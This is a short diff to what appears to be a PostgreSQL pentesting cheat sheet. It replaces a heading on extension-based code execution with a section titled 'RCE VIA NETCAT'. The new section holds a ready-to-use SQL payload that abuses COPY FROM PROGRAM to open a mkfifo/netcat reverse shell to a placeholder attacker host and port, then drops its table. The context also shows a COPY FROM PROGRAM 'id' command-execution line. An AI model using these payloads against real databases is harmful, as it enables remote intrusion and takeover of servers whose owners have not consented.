@@ -717,9 +717,13 @@ COPY tmp FROM PROGRAM 'id';
 SELECT * FROM tmp;
 DROP TABLE tmp;
 ```
-# RCE with PostgreSQL Extensions
+# RCE VIA NETCAT
 
-This guide outlines the process for achieving Remote Code Execution (RCE) by leveraging PostgreSQL extensions.
+```sql
+CREATE TABLE dbBackups(backup TEXT); COPY dbBackups FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc PWNIP PWNPO >/tmp/f';SELECT * FROM dbBackups; DROP TABLE dbBackups; --
+
+```
+
 
 ## 1. Preparing the Development Environment
 
